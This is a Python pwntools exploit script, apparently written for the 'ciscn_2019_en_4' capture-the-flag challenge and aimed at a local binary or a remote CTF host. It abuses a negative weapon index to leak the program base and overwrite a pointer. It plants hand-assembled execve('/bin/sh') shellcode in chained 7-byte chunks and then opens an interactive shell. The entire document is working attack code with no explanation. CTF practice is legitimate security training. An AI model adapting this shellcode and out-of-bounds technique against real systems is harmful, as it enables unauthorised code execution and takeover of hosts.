import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_en_4')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_en_4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',25847)
			elf=ELF('./ciscn_2019_en_4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]


		def change():
			io.sendlineafter('Your choice:','1')
			io.sendlineafter('Money makes you stronger:','30')

		def add(a):
			io.sendlineafter('Your choice:','2')
			io.sendafter('input WeaponName:',a)

		def edit(a,b):
			io.sendlineafter('Your choice:','3')
			io.sendlineafter(' Weapon id:',str(a))
			io.sendafter('new Name:',b)

		def show(a):
			io.sendlineafter('Your choice:','4')
			io.sendlineafter('Which Weapon do you want to show?',str(a))

		change()
		shell=asm(shellcraft.sh())
		edit(0,"\x90\x31\xf6\x56\x56\xeb\x05\n")  # exit ---> shellocde
		edit(1,"\xbb\x2f\x62\x69\x6e\xeb\x05\n")  # push
		edit(2,"\x90\x90\x89\x1c\x24\xeb\x05\n")  # push
		edit(3,"\xbb\x2f\x2f\x73\x68\xeb\x05\n")  # push
		edit(4,"\x89\x5c\x24\x04\x90\xeb\x05\n")  # push
		edit(5,"\x48\x89\xe7\x6a\x3b\xeb\x05\n")  # push
		edit(6,"\x58\x48\x31\xd2\x0f\x05\n")  # push
		# edit(22,'aaaa\x00')
		show(-1)
		io.recvuntil('is:')
		elf_base=u64(io.recv(6)+'\x00\x00')-0x203DB8
		elf.address=elf_base
		edit(-1,p64(elf_base+0x204088))
		io.sendline('2')


		

		

			


		
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		success('elf_base:'+hex(elf_base))
		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue